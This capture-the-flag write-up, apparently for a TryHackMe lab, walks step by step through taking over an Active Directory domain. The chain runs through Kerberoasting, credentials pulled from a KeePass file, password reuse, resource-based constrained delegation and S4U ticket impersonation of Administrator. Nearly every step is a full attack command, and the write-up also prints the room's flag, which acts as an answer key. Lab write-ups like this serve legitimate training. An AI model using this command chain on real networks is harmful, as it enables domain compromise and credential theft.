# Active Directory RBCD Lab

A walkthrough of a Resource-Based Constrained Delegation (RBCD) attack against an Active Directory environment using TryHackMe's Forward lab.

## Lab Overview

| Detail | Value |
|---|---|
| Target | DC01.ctf.local (10.48.137.121) |
| Domain | ctf.local |
| Attack Path | RBCD → S4U2Proxy → Domain Admin |
| Tools | Nmap, CrackMapExec, Impacket, KeePass, xfreerdp |

## Attack Flow

```
Nmap Scan → LDAP Enumeration → Kerberoasting → SMB Enumeration
    → RDP Login → KeePass Database → Password Reuse (r.williams)
    → MachineAccountQuota → Add Computer → RBCD Config
    → Kerberos S4U → Pass-the-Ticket → Domain Compromise
```

---

## Phase 1: Reconnaissance

### Network Scan

```bash
nmap -sC 10.48.137.121
```

![Nmap scan showing open ports](01-network-scan.png)

### Service Version Detection

```bash
nmap -sV 10.48.137.121
```

![Nmap service versions](18-nmap-service-versions.png)

**Findings:** Domain Controller running DNS (53), Kerberos (88), LDAP (389/636), SMB (445), RDP (3389).

---

## Phase 2: Enumeration

### LDAP Enumeration

```bash
ldapsearch -x -H ldap://10.48.137.121 -s base namingcontexts
```

![LDAP naming contexts](02-ldap-enumeration.png)

### User Enumeration

```bash
impacket-GetADUsers ctf.local/j.smith:'JSmith@IT2024' -dc-ip 10.48.137.121 -all
```

![GetADUsers output](03-user-enumeration.png)

**Users discovered:** Administrator, Guest, krbtgt, j.smith, t.jones, r.williams, svc.helpdesk

### Sysadmin Group Enumeration

```bash
ldapsearch -x -H ldap://10.48.137.121 -D "CTF\j.smith" -w 'JSmith@IT2024' -b "DC=ctf,DC=local" "(cn=sysadmin)"
```

![Sysadmin group members](20-sysadmin-group.png)

**Key finding:** r.williams is a member of the sysadmin group.

### r.williams Details

```bash
ldapsearch -x -H ldap://10.48.137.121 -D "CTF\j.smith" -w 'JSmith@IT2024' -b "DC=ctf,DC=local" "(sAMAccountName=r.williams)"
```

![r.williams LDAP details](21-rwilliams-details.png)

**Key finding:** r.williams = "Help Desk Senior", memberOf sysadmin + Remote Desktop Users.

---

## Phase 3: Credential Access

### Kerberoasting

```bash
impacket-GetUserSPNs ctf.local/j.smith:'JSmith@IT2024' -dc-ip 10.48.137.121 -request
```

![Kerberoast hash extraction](04-kerberoasting.png)

### Hashcat Attempt

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

![Hashcat exhausted](19-hashcat-exhausted.png)

**Result:** Password not cracked (Exhausted). Attack path moves to credential reuse.

### SMB Enumeration

```bash
crackmapexec smb 10.48.137.121 -u j.smith -p 'JSmith@IT2024' --shares
```

![SMB share listing](05-smb-enumeration.png)

![smbmap detailed shares](23-smbmap-shares.png)

---

## Phase 4: Initial Access

### RDP Login (j.smith)

```bash
xfreerdp /v:10.48.137.121 /u:j.smith /p:'JSmith@IT2024' /cert:ignore
```

![RDP desktop](06-rdp-login.png)

### KeePass Database Found

Navigated to Documents folder via RDP:

![Database.kdbx in Documents](07-keepass-database.png)

### KeePass Credentials Extracted

Opened Database.kdbx in KeePass:

![KeePass t.jones entry](08-keepass-extracted.png)

**Credentials found:** t.jones / Helpdesk01!

---

## Phase 5: Lateral Movement

### Password Reuse Confirmation

```bash
crackmapexec smb 10.48.137.121 -u t.jones -p 'Helpdesk01!'
```

![Password reuse t.jones](09-password-reuse.png)

**Result:** t.jones:Helpdesk01! works. Testing if r.williams uses the same password.

### r.williams Access

```bash
crackmapexec smb 10.48.137.121 -u r.williams -p 'Helpdesk01!'
```

![r.williams password reuse](10-rwilliams-access.png)

**Result:** r.williams:Helpdesk01! works! Same password across accounts.

---

## Phase 6: Privilege Escalation

### MachineAccountQuota Check

```bash
ldapsearch -x -H ldap://10.48.137.121 -D "CTF\r.williams" -w 'Helpdesk01!' \
  -b "DC=ctf,DC=local" "(objectClass=domainDNS)" ms-DS-MachineAccountQuota
```

![MachineAccountQuota = 10](11-machineaccountquota.png)

### Privilege Analysis

On r.williams' RDP session:

```cmd
whoami /priv
```

![SeMachineAccountPrivilege](22-machineaccountprivilege.png)

**Key finding:** SeMachineAccountPrivilege is present (Disabled, but MachineAccountQuota allows adding 10 machine accounts).

### Add Machine Account

```bash
impacket-addcomputer -dc-ip 10.48.137.121 \
  -computer-name HERMESMED$ \
  -computer-pass 'HermesRBCD!2026' \
  ctf.local/r.williams:'Helpdesk01!'
```

![Add computer HERMESMED$](12-addcomputer.png)

### RBCD Configuration

```bash
impacket-rbcd \
  -dc-ip 10.48.137.121 \
  -action write \
  -delegate-to DC01$ \
  -delegate-from HERMESMED$ \
  ctf.local/r.williams:'Helpdesk01!'
```

![RBCD delegation configured](13-rbcd-configuration.png)

### Kerberos S4U Ticket

```bash
impacket-getST \
  -dc-ip 10.48.137.121 \
  -spn cifs/DC01.ctf.local \
  -impersonate Administrator \
  ctf.local/HERMESMED$:'HermesRBCD!2026'
```

![getST Administrator.ccache](14-kerberos-s4u.png)

---

## Phase 7: Domain Compromise

### Pass-the-Ticket

```bash
export KRB5CCNAME=Administrator.ccache
```

![Pass the ticket setup](15-pass-the-ticket.png)

### Administrator Shell

```bash
impacket-smbclient -k -no-pass Administrator@DC01.ctf.local
```

![SMBClient as Administrator](16-administrator-shell.png)

### Flag Retrieved

```bash
# use C$
# cd Users\Administrator\Desktop
# get flag.txt
# cat flag.txt
```

![Flag contents](17-flag-retrieved.png)

```
THM{RBCD_S4U2Pr0xy_Tick3t_Th3ft_2_DA}
```

---

## Summary

| Phase | Step | Result |
|---|---|---|
| Recon | Nmap scan | 10 open ports, DC01 identified |
| Enum | LDAP + GetADUsers | 7 user accounts discovered |
| Enum | Sysadmin group | r.williams identified as target |
| Cred Access | Kerberoasting | Hash not crackable |
| Cred Access | KeePass | t.jones:Helpdesk01! found |
| Lateral | Password reuse | r.williams:Helpdesk01! confirmed |
| Privesc | MachineAccountQuota | 10 machine accounts allowed |
| Privesc | Add computer | HERMESMED$ created |
| Privesc | RBCD config | Delegation to DC01$ set |
| Privesc | S4U ticket | Administrator.ccache obtained |
| Compromise | Pass-the-ticket | Domain Admin achieved |
| Compromise | Flag | THM{RBCD_S4U2Pr0xy_Tick3t_Th3ft_2_DA} |
